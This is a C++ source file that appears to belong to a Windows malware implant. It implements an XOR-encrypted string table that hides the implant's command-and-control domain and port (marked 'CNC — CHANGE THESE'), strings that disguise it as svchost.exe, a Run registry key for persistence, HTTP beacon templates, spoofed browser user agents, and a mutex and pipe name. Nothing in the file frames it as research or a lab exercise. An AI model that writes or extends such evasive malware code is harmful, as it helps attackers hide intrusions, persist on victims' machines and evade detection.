// obfuscate.cpp — XOR-obfuscated string table implementation.
//
// Every entry is stored as a hex array — pre-XOR-encrypted at compile time
// using enc.cpp (the companion encoder tool). At runtime, toggle_obfuscate()
// flips between ciphertext and plaintext.
//
// The table is guarded by a per-entry mutex array — two threads can't
// simultaneously toggle the same entry, but different entries can be
// accessed concurrently.

#include "obfuscate.hpp"
#include <cstring>
#include <algorithm>
#include <mutex>
#include <vector>

namespace obf {

// --- internal storage ---

struct Entry {
    std::vector<uint8_t> data;  // XOR-obfuscated bytes
    bool                 locked = false; // true = currently obfuscated
    std::mutex           mtx;
};

static std::array<Entry, static_cast<size_t>(Id::COUNT)> g_table;
static std::once_flag g_init_flag;

// --- XOR helper ---

static void xor_data(std::vector<uint8_t>& data) {
    const uint8_t k0 = (XOR_KEY >> 24) & 0xFF;
    const uint8_t k1 = (XOR_KEY >> 16) & 0xFF;
    const uint8_t k2 = (XOR_KEY >> 8)  & 0xFF;
    const uint8_t k3 =  XOR_KEY        & 0xFF;

    for (size_t i = 0; i < data.size(); ++i) {
        switch (i % 4) {
            case 0: data[i] ^= k0; break;
            case 1: data[i] ^= k1; break;
            case 2: data[i] ^= k2; break;
            case 3: data[i] ^= k3; break;
        }
    }
}

// --- build-time XOR helper for initializers ---
//  enc.cpp does this offline; here we store plaintext and XOR on init.

static void store_plaintext(Id id, const char* str) {
    auto& entry = g_table[static_cast<size_t>(id)];
    size_t len = std::strlen(str);
    entry.data.assign(str, str + len);
    // Immediately XOR so the string is obfuscated in memory.
    xor_data(entry.data);
    entry.locked = true;
}

void init() {
    std::call_once(g_init_flag, []() {
        // === CNC — CHANGE THESE ===
        store_plaintext(Id::CNC_DOMAIN,    "127.0.0.1");
        store_plaintext(Id::CNC_PORT,      "19443");

        // === process disguise ===
        store_plaintext(Id::PROC_NAME,     "svchost.exe");
        store_plaintext(Id::PROC_TITLE,    "Service Host: Network Service");

        // === persistence ===
        store_plaintext(Id::REGISTRY_KEY,
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
        store_plaintext(Id::REGISTRY_VALUE,
            "ServiceHost");

        // === HTTP templates ===
        store_plaintext(Id::HTTP_GET_TEMPLATE,
            "GET %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            "Accept-Language: en-US,en;q=0.5\r\n"
            "Accept-Encoding: gzip, deflate\r\n"
            "Connection: keep-alive\r\n"
            "Cache-Control: no-cache\r\n"
            "\r\n");
        store_plaintext(Id::HTTP_POST_TEMPLATE,
            "POST %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: %d\r\n"
            "Connection: keep-alive\r\n"
            "\r\n"
            "%s");
        store_plaintext(Id::HTTP_HEAD_TEMPLATE,
            "HEAD %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Connection: close\r\n"
            "\r\n");

        // === DNS template ===
        store_plaintext(Id::DNS_QUERY_PREFIX,
            "\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00");

        // === user agents (Chrome 120+, Firefox 121+, Edge, Safari) ===
        store_plaintext(Id::UA_CHROME_WIN,
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            " (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
        store_plaintext(Id::UA_CHROME_MAC,
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
            " (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
        store_plaintext(Id::UA_FIREFOX,
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0)"
            " Gecko/20100101 Firefox/121.0");
        store_plaintext(Id::UA_EDGE,
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            " (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0");
        store_plaintext(Id::UA_SAFARI,
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
            " (KHTML, like Gecko) Version/17.2 Safari/605.1.15");

        // === mutex / IPC ===
        store_plaintext(Id::MUTEX_NAME,  "Global\\SvcHostNetworkMutex");
        store_plaintext(Id::PIPE_NAME,   "\\\\.\\pipe\\svchost-net");
    });
}

// --- public API ---

void toggle_obfuscate(Id id) {
    auto& entry = g_table[static_cast<size_t>(id)];
    std::lock_guard<std::mutex> lock(entry.mtx);
    xor_data(entry.data);
    entry.locked = !entry.locked;
}

std::string_view retrieve(Id id) {
    auto& entry = g_table[static_cast<size_t>(id)];
    // Caller is responsible for ensuring the entry is unlocked.
    return std::string_view(
        reinterpret_cast<const char*>(entry.data.data()),
        entry.data.size());
}

std::string retrieve_copy(Id id) {
    // Unlock → copy → re-lock. Always leaves entry obfuscated.
    toggle_obfuscate(id);
    auto& entry = g_table[static_cast<size_t>(id)];
    std::string result(
        reinterpret_cast<const char*>(entry.data.data()),
        entry.data.size());
    toggle_obfuscate(id);
    return result;
}

} // namespace obf
